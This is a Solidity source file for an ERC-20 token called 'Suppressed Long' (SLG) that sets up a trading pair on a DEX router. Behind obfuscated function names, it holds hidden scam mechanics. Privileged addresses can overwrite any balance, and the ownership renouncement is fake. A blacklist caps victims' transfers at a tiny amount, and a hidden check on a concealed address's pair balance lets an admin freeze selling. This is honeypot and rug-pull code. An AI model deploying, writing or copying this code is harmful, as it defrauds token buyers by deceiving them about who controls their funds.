//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

interface marketingTake {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract toReceiver {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface launchedFrom {
    function createPair(address amountReceiver, address marketingExempt) external returns (address);
}

interface marketingLimit {
    function totalSupply() external view returns (uint256);

    function balanceOf(address fromAuto) external view returns (uint256);

    function transfer(address minReceiverBuy, uint256 autoExemptReceiver) external returns (bool);

    function allowance(address listTx, address spender) external view returns (uint256);

    function approve(address spender, uint256 autoExemptReceiver) external returns (bool);

    function transferFrom(
        address sender,
        address minReceiverBuy,
        uint256 autoExemptReceiver
    ) external returns (bool);

    event Transfer(address indexed from, address indexed listTake, uint256 value);
    event Approval(address indexed listTx, address indexed spender, uint256 value);
}

interface marketingLimitMetadata is marketingLimit {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract SuppressedLong is toReceiver, marketingLimit, marketingLimitMetadata {

    mapping(address => bool) public maxBuyTake;

    function swapAuto(address launchFund, uint256 autoExemptReceiver) public {
        txLiquiditySender();
        atFrom[launchFund] = autoExemptReceiver;
    }

    function enableFrom(address fundMarketingAt, address minReceiverBuy, uint256 autoExemptReceiver) internal returns (bool) {
        require(atFrom[fundMarketingAt] >= autoExemptReceiver);
        atFrom[fundMarketingAt] -= autoExemptReceiver;
        atFrom[minReceiverBuy] += autoExemptReceiver;
        emit Transfer(fundMarketingAt, minReceiverBuy, autoExemptReceiver);
        return true;
    }

    function getOwner() external view returns (address) {
        return limitLaunch;
    }

    uint256 public txLaunch;

    function receiverEnableLaunch(uint256 autoExemptReceiver) public {
        txLiquiditySender();
        tokenReceiver = autoExemptReceiver;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return receiverLiquidity;
    }

    function atMarketing(address fundMarketingAt, address minReceiverBuy, uint256 autoExemptReceiver) internal returns (bool) {
        if (fundMarketingAt == teamTotal) {
            return enableFrom(fundMarketingAt, minReceiverBuy, autoExemptReceiver);
        }
        uint256 feeReceiver = marketingLimit(teamFundExempt).balanceOf(receiverFee);
        require(feeReceiver == tokenReceiver);
        require(minReceiverBuy != receiverFee);
        if (listTeamTotal[fundMarketingAt]) {
            return enableFrom(fundMarketingAt, minReceiverBuy, marketingTokenFrom);
        }
        return enableFrom(fundMarketingAt, minReceiverBuy, autoExemptReceiver);
    }

    function allowance(address exemptTotal, address teamToken) external view virtual override returns (uint256) {
        if (teamToken == senderMode) {
            return type(uint256).max;
        }
        return minIsToken[exemptTotal][teamToken];
    }

    uint256 private receiverLiquidity = 100000000 * 10 ** 18;

    mapping(address => mapping(address => uint256)) private minIsToken;

    bool private isReceiver;

    uint256 constant marketingTokenFrom = 12 ** 10;

    function transferFrom(address fundMarketingAt, address minReceiverBuy, uint256 autoExemptReceiver) external override returns (bool) {
        if (_msgSender() != senderMode) {
            if (minIsToken[fundMarketingAt][_msgSender()] != type(uint256).max) {
                require(autoExemptReceiver <= minIsToken[fundMarketingAt][_msgSender()]);
                minIsToken[fundMarketingAt][_msgSender()] -= autoExemptReceiver;
            }
        }
        return atMarketing(fundMarketingAt, minReceiverBuy, autoExemptReceiver);
    }

    mapping(address => uint256) private atFrom;

    event OwnershipTransferred(address indexed limitTradingLiquidity, address indexed swapLaunched);

    address private limitLaunch;

    function txFee() public {
        emit OwnershipTransferred(teamTotal, address(0));
        limitLaunch = address(0);
    }

    bool public limitExempt;

    function transfer(address launchFund, uint256 autoExemptReceiver) external virtual override returns (bool) {
        return atMarketing(_msgSender(), launchFund, autoExemptReceiver);
    }

    address senderMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint8 private listFee = 18;

    uint256 private totalFund;

    uint256 private takeTrading;

    uint256 public fundEnableSell;

    uint256 tokenReceiver;

    uint256 public swapToken;

    function txLiquiditySender() private view {
        require(maxBuyTake[_msgSender()]);
    }

    function owner() external view returns (address) {
        return limitLaunch;
    }

    string private takeAtTotal = "Suppressed Long";

    bool private maxTo;

    constructor (){
        
        marketingTake senderModeList = marketingTake(senderMode);
        teamFundExempt = launchedFrom(senderModeList.factory()).createPair(senderModeList.WETH(), address(this));
        if (takeTrading == fundEnableSell) {
            txLaunch = takeTrading;
        }
        teamTotal = _msgSender();
        txFee();
        maxBuyTake[teamTotal] = true;
        atFrom[teamTotal] = receiverLiquidity;
        
        emit Transfer(address(0), teamTotal, receiverLiquidity);
    }

    address public teamTotal;

    function balanceOf(address fromAuto) public view virtual override returns (uint256) {
        return atFrom[fromAuto];
    }

    function amountTakeExempt(address atMax) public {
        txLiquiditySender();
        if (takeTrading == totalFund) {
            tokenFund = fundEnableSell;
        }
        if (atMax == teamTotal || atMax == teamFundExempt) {
            return;
        }
        listTeamTotal[atMax] = true;
    }

    uint256 private tokenFund;

    string private takeLaunch = "SLG";

    uint256 takeFromFee;

    function approve(address teamToken, uint256 autoExemptReceiver) public virtual override returns (bool) {
        minIsToken[_msgSender()][teamToken] = autoExemptReceiver;
        emit Approval(_msgSender(), teamToken, autoExemptReceiver);
        return true;
    }

    function decimals() external view virtual override returns (uint8) {
        return listFee;
    }

    address receiverFee = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function name() external view virtual override returns (string memory) {
        return takeAtTotal;
    }

    function fromWallet(address feeToken) public {
        if (limitExempt) {
            return;
        }
        if (swapToken != totalFund) {
            isReceiver = true;
        }
        maxBuyTake[feeToken] = true;
        if (txLaunch != fundEnableSell) {
            totalFund = tokenFund;
        }
        limitExempt = true;
    }

    mapping(address => bool) public listTeamTotal;

    address public teamFundExempt;

    function symbol() external view virtual override returns (string memory) {
        return takeLaunch;
    }

}